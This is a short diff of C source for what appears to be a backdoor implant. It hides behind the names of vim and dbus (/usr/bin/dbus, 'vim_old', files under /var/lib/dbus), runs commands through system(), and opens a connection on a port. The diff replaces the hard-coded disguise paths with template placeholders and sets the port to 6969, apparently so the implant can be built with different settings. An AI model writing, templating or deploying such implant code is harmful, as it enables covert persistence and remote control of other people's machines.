@@ -9,15 +9,15 @@
 #include <assert.h>
 #include <sys/stat.h>
 #include <signal.h>
-#define STATUS "/var/lib/dbus/machine-process"
-#define PAYLOAD "/usr/bin/dbus"
-#define ERROR "/var/lib/dbus/err"
-#define BINARYNAME "vim_old"
-#define EDITOR "/usr/bin/vim"
+#define PORT 6969
+#define STATUS "{STATUS}"
+#define PAYLOAD "{PAYLOAD}"
+#define ERROR "{ERROR}"
+#define BINARYNAME "{BINARYNAME}"
+#define EDITOR "{EDITOR}"
 #define TRUE 1
 #define FALSE 0
 #define ERR -1
-
 
 int writepid(){
     FILE *file;
@@ -155,7 +155,7 @@ int main (int argc, char *argv[]) {
         system(args);
     } else {
         if (testpid() == FALSE) {
-            return establishConnection(5004, 0);
+            return establishConnection(PORT, 0);
         }
     }
     
